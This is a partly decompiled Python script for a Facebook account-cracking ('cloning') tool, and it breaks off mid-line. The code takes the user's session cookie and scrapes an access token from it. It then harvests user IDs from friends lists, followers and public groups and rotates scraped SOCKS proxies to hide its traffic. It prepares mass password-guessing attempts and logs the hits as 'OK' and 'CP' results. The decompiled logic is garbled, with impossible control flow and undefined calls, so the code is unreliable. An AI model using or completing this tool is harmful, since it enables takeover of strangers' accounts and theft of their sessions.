# DECOMPYLE BY MR DARK
# TYPE : HALF DEC

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON = sol()
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
finally:
    pass
if Exception:
    e = None
    
    try:
        print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;97mABIR-RAHMAN]')
    finally:
        e = None
        del e
    e = None
    del e
    prox = open('.prox.txt', 'r').read().splitlines()
    
    def uaku():
        
        try:
            ua = open('bbnew.txt', 'r').read().splitlines()
        finally:
            return None
            a = requests.get('https://github.com/D4rk-B0y/apruve.txt').text
            ua = open('.bbnew.txt', 'w')
            aa = re.findall('line">(.*?)<', str(a))
            ua = open('.bbnew.txt', 'r').read().splitlines()
            return None


    (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
    cokbrut = []
    pwpluss = []
    pwnya = []
    P = '\x1b[1;97m'
    M = '\x1b[1;91m'
    H = '\x1b[1;92m'
    K = '\x1b[1;93m'
    B = '\x1b[1;94m'
    U = '\x1b[1;95m'
    O = '\x1b[1;96m'
    N = '\x1b[0m'
    Z = '\x1b[1;30m'
    sir = '\x1b[41m\x1b[1;97m'
    x = '\x1b[m'
    m = '\x1b[1;91m'
    k = '\x1b[93m'
    h = '\x1b[1;92m'
    hh = '\x1b[32m'
    u = '\x1b[95m'
    kk = '\x1b[33m'
    b = '\x1b[1;96m'
    p = '\x1b[0;34m'
    asu = random.choice([
        m,
        k,
        h,
        u,
        b])
    dic = {
        '1': 'January',
        '2': 'February',
        '3': 'March',
        '4': 'April',
        '5': 'May',
        '6': 'June',
        '7': 'July',
        '8': 'August',
        '9': 'September',
        '10': 'October',
        '11': 'November',
        '12': 'December' }
    dic2 = {
        '01': 'January',
        '02': 'February',
        '03': 'March',
        '04': 'April',
        '05': 'May',
        '06': 'June',
        '07': 'July',
        '08': 'August',
        '09': 'September',
        '10': 'October',
        '11': 'November',
        '12': 'Devember' }
    tgl = datetime.datetime.now().day
    bln = dic[str(datetime.datetime.now().month)]
    thn = datetime.datetime.now().year
    okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
    cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
    
    def alvino_xy(u):
        pass

    
    def clear():
        os.system('clear')

    
    def back():
        login()

    
    def banner():
        clear()
        sol()
        ban = " © MASTER MIND JOKER MAFI'A\n   \n $$$$$$\\  $$$$$$$\\  $$$$$$\\ $$$$$$$\\  \n$$  __$$\\ $$  __$$\\ \\_$$  _|$$  __$$\\ \n$$ /  $$ |$$ |  $$ |  $$ |  $$ |  $$ |\n$$$$$$$$ |$$$$$$$\\ |  $$ |  $$$$$$$  |\n$$  __$$ |$$  __$$\\   $$ |  $$  __$$< \n$$ |  $$ |$$ |  $$ |  $$ |  $$ |  $$ |\n$$ |  $$ |$$$$$$$  |$$$$$$\\ $$ |  $$ |\n\\__|  \\__|\\_______/ \\______|\\__|  \\__|\n                                      \n                                      \n                                                                           "
        cetak(nel(ban, 'white', **('style',)))

    
    def login():
        
        try:
            token = open('.token.txt', 'r').read()
            cok = open('.cok.txt', 'r').read()
            tokenku.append(token)
            
            try:
                sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], {
                    'cookie': cok }, **('cookies',))
                sy2 = json.loads(sy.text)['name']
                sy3 = json.loads(sy.text)['id']
                menu(sy2, sy3)
            finally:
                return None
                if KeyError:
                    login_lagi334()
                return None
                if requests.exceptions.ConnectionError:
                    li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
                    lo = mark(li, 'red', **('style',))
                    sol().print(lo, 'purple', **('style',))
                    exit()
                return None
                if IOError:
                    login_lagi334()
                    return None



    
    def login_lagi334():
        
        try:
            os.system('clear')
            banner()
            cetak(nel('\t             WELLCOME : [green]ENJOY PUBLIC TOOL[purple] '))
            asu = random.choice([
                m,
                k,
                h,
                b,
                u])
            cookie = input(f'''  [{h}•{u}] INPUT COOKIES :{asu} ''')
            data = requests.get('https://business.facebook.com/business_locations', {
                'user-agent': 'Mozilla/5.0 (Linux; Android 9; XIAOMI Mi Note 10 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.15.0',
                'referer': 'https://www.facebook.com/',
                'host': 'business.facebook.com',
                'origin': 'https://business.facebook.com',
                'upgrade-insecure-requests': '1',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8',
                'content-type': 'text/html; charset=utf-8' }, {
                'cookie': cookie }, **('headers', 'cookies'))
            find_token = re.search('(EAAG\\w+)', data.text)
            ken = open('.token.txt', 'w').write(find_token.group(1))
            cok = open('.cok.txt', 'w').write(cookie)
            print(f'''  {u}[{h}•{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ''')
            time.sleep(1)
            exit()
        finally:
            return None
            if Exception:
                e = None
                
                try:
                    os.system('rm -f .token.txt')
                    os.system('rm -f .cok.txt')
                    print('  %s[%sx%s]%s LOGIN ERROR....TRY AGAIN !!%s' % (x, k, x, m, x))
                    exit()
                finally:
                    e = None
                    del e
                    return None
                    e = None
                    del e



    
    def menu(my_name, my_id):
        
        try:
            token = open('.token.txt', 'r').read()
            cok = open('.cok.txt', 'r').read()
        finally:
            pass

        None if IOError else os.system('clear')
        banner()
        ip = requests.get('https://api.ipify.org').text
        cetak(nel('\tWELCOM [green]%s[purple] LOGIN USER' % my_name))
        alvino_xy(f'''{u}ID  : ''' + str(my_id))
        alvino_xy(f'''{h}IP  : {ip}''')
        cetak(nel('\t[bold cyan]           • CHOOSE CLONING MENU • [/bold cyan]'))
        print('')
        cetak(nel('[bold green] ❤️1. CRACK PUBLIK ID\n  ❤️2. CHEK RESULTS\n ❤️0. EXIT [bold green]'))
        _____cowok__pink_____ = input('\n CHOOSE : ')
        if _____cowok__pink_____ in ('1',):
            dump_massal()
            return None
        if None in ('2',):
            result()
            return None
        if None in ('3',):
            dump_massal()
            return None
        if None in ('4',):
            crack_file()
            return None
        if None in ('5',):
            result()
            return None
        if None in ('0',):
            os.system('rm -rf .token.txt')
            os.system('rm -rf .cookie.txt')
            print('=>DONE LOGUT ')
            exit()
            return None
        None('=>CHOOSE RIGHT MNEU ')
        back()

    
    def error():
        print(f'''{k}=>TRY AGAIN {u}''')
        time.sleep(4)
        back()

    
    def result():
        print('=>Ok IDZ ')
        print('=>CP IDZ ')
        print('=>EXIT\t')
        kz = input('\n=>CHOOSE : ')
        if kz in ('1', '01'):
            
            try:
                vin = os.listdir('CP')
            finally:
                pass

            if None if FileNotFoundError else len(vin) == 0:
                print('=>Anda Tidak Memiliki Hasil CP ')
                time.sleep(2)
                back()
                return None
            cih = None
            lol = { }
            geeh = input('\n=>CHOSE : ')
            
            try:
                geh = lol[geeh]
            finally:
                pass
            if KeyError:
                [ '[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + u for isi in vin ]
                [ '[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + u for isi in vin ]
                [ '[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + u for isi in vin ]
                print('=>Pilih Yang Bener Kontol ')
                exit()
            else:
                
                try:
                    lin = open('CP/' + geh, 'r').read().splitlines()
                finally:
                    pass
                print('=>File Tidak Di Temukan ')
                time.sleep(2)
                back()
                nocp = 0
                input('[ Klik Enter ]')
                back()
                return None
                if kz in ('2', '02'):
                    
                    try:
                        vin = os.listdir('OK')
                    finally:
                        pass

                    if [ mark(cpkuh, 'yellow', **('style',)) for cpku in range(len(lin)) ] if FileNotFoundError else len(vin) == 0:
                        print('=>Anda Tidak Mempunyai File OK ')
                        time.sleep(2)
                        back()
                        return None
                    cih = [ mark(cpkuh, 'yellow', **('style',)) for cpku in range(len(lin)) ]
                    lol = { }
                    geeh = input('\n=>Pilih : ')
                    
                    try:
                        geh = lol[geeh]
                    finally:
                        pass
                    if KeyError:
                        [ '[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + u for isi in vin ]
                        [ '[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + u for isi in vin ]
                        [ '[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + u for isi in vin ]
                        print('=>Pilih Yang Bener TOLOL ')
                        exit()
                    else:
                        
                        try:
                            lin = open('OK/' + geh, 'r').read().splitlines()
                        finally:
                            pass
                        print('=>File Tidak Di Temukan ')
                        time.sleep(2)
                        back()
                        nocp = 0
                        input('[ Klik Enter ]')
                        back()
                        return None
                        if kz in ('0', '00'):
                            back()
                            return None
                        [ f'''{hh}COOKIE : {u}{cpkuni[2]}''' for cpku in range(len(lin)) ]('=>Pilih Yang Bener TOLOL ')
                        exit()
                        return None





    
    def dump_massal():
        
        try:
            token = open('.token.txt', 'r').read()
            cok = open('.cok.txt', 'r').read()
        finally:
            pass

        if None if IOError else None if ValueError else jum < 1 or jum > 100000000:
            print('=>TRY AGAIN ')
            exit()
        ses = requests.Session()
        yz = 0
        for userr in uid:
            
            try:
                col = ses.get('https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0], {
                    'cookies': cok }, **('cookies',)).json()
                for mi in col['friends']['data']:
                    
                    try:
                        iso = mi['id'] + '|' + mi['name']
                        if iso in id:
                            pass
                        else:
                            id.append(iso)
                    finally:
                        continue
                        [ kl for met in range(jum) ]
                        continue
                        continue
                        if (KeyError, IOError):
                            continue
                        if requests.exceptions.ConnectionError:
                            print('{k}=>TRY AGAIN ')
                            exit()
                            continue
                            
                            try:
                                print('')
                                print(f'''{k}=>TOTAL ID★{b}''' + str(len(id)))
                                setting()
                            finally:
                                return None
                                if requests.exceptions.ConnectionError:
                                    print(f'''{u}''')
                                    print('=>Sinyal Lo kek Kontol ')
                                    back()
                                    return None
                                if (KeyError, IOError):
                                    print(f'''➥=>{k} IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWSE CHEK YOUR ID LNK {u}''')
                                    time.sleep(3)
                                    back()
                                    return None




    
    def dump_pengikut():
        
        try:
            token = open('.token.txt', 'r').read()
            cok = open('.cok.txt', 'r').read()
        finally:
            pass

        None if IOError else print('=>TYPE ME IF YOU WNT DUMP TOKEN ID FRIENDS ')
        pil = input('➥➣ENTER ID LNK : ')
        
        try:
            koh2 = requests.get('https://graph.facebook.com/' + pil + '?fields=subscribers.limit(99999)&access_token=' + tokenku[0], {
                'cookie': cok }, **('cookies',)).json()
            for pi in koh2['subscribers']['data']:
                
                try:
                    id.append(pi['id'] + '|' + pi['name'])
                finally:
                    continue
                    continue
                    print(f'''=>Total Idz :{h} ''' + str(len(id)))
                    setting()
                    return None
                    if requests.exceptions.ConnectionError:
                        print('=>CHEK INTRNT ')
                        exit()
                        return None
                    if (KeyError, IOError):
                        print('=>ERORR ')
                        exit()
                        return None



    balmond = b + '[' + h + '✓' + b + ']'
    
    def lah():
        print('\r' + balmond + m + ' \x1b[1;95mTotal ID Yang Terkumpul :\x1b[1;97m ' + str(len(id)) + '                     ')
        input(balmond + m + '\x1b[1;97m Klik [\x1b[1;96m Enter ]\x1b[1;97m Jika Ingin Langsung Crack !!')
        setting()

    
    def grup():
        print('')
        id = input('' + balmond + h + ' \x1b[1;94m>> ENTER GRUP LINK :\x1b[1;94m ')
        ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
        miskinlu = {
            'user-agent': ua }
        url = 'https://mbasic.facebook.com/groups/' + id
        ses = requests.Session()
        
        try:
            gn = parser(ses.get(url, miskinlu, **('headers',)).text, 'html.parser')
        finally:
            pass

        berr = None if requests.exceptions.ConnectionError else gn.find('title')
        berr2 = berr.text.replace(' | Facebook', '').replace(' Grup Publik', '')
        if berr2 == 'Masuk Facebook':
            print(balmond + m + ' Limit, Silahkan Mode Pesawat Dan Coba Lagi..')
            time.sleep(0.5)
            crack_grup()
        elif berr2 == 'Kesalahan':
            jalan(balmond + m + ' Grup Tidak Ditemukan..')
            time.sleep(0.5)
            crack_grup()
        
        print('' + balmond + p + ' \x1b[1;94m>> Nama Grup :\x1b[1;97m ' + berr2)
        ggs = gn.find_all('table')
        ang = []
        for ff in ggs:
            anggo = ff.text
            bro = anggo.replace('Anggota', '')
            
            try:
                mex = int(bro)
                jumlah = ang.append(mex)
            finally:
                continue
                continue
                if len(ang) == 0:
                    print(balmond + h + ' Anggota : -')
                else:
                    print(balmond + h + ' \x1b[1;94m>> Anggota :\x1b[1;97m ' + str(ang[0]))
                grup1(url)
                return None


    
    def grup1(urls):
        use = []
        ses = requests.Session()
        print('' + balmond + m + ' \x1b[1;94mJika Berhenti, Mode Pesawat 5 Detik')
        print(balmond + m + ' \x1b[1;94mSedang Mengumpulkan ID')
        print(balmond + m + ' \x1b[1;94mTekan CTRL + C Untuk Stop')
        
        try:
            ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
            miskinlu = {
                'user-agent': ua }
            
            try:
                url = use[0]
            finally:
                pass
            url = urls
            set = parser(ses.get(url, miskinlu, **('headers',)).text, 'html.parser')
            bf2 = set.find_all('a')
            tes = set.find_all('table')
            id.append(idku)
            print('\r' + balmond + h + ' { ' + k + 'Proses Mengambil ID ' + str(len(id)) + h + ' }', '', **('end',))
            sys.stdout.flush()
            continue
            if '>' in spl:
                idsiapa = re.findall('content_owner_id_new.\\w+', str(cari))
                idyou = idsiapa[0].replace('content_owner_id_new.', '')
                namayou = liatnih.split(' > ')[0]
                idku = idyou + '|' + namayou
                if idku in id:
                    continue
                id.append(idku)
                print('\r' + balmond + h + ' { ' + O + 'Mengumpulkan ID ' + str(len(id)) + h + ' }', '', **('end',))
                sys.stdout.flush()
                continue

            continue
            
            try:
                link_ = bcj2
                use.insert(0, 'https://mbasic.facebook.com' + link_)
            finally:
                pass
            girang = set.find('title')
            girang2 = girang.text.replace(' | Facebook', '').replace(' Grup Publik', '')
            if girang2 == 'Masuk Facebook':
                pass
            else:
                lah()

        finally:
            pass
        if requests.exceptions.ConnectionError:
            
            try:
                time.sleep(31)
            finally:
                pass
            if KeyboardInterrupt:
                lah()
            


        if KeyboardInterrupt:
            lah()
        

    
    def crack_file():
        
        try:
            vin = os.listdir('DUMP')
        finally:
            pass

        if None if FileNotFoundError else len(vin) == 0:
            print('=>Kamu Tidak Memiliki File Dump ')
            time.sleep(2)
            back()
            return None
        cih = None
        lol = { }
        geeh = input('\n=>Pilih
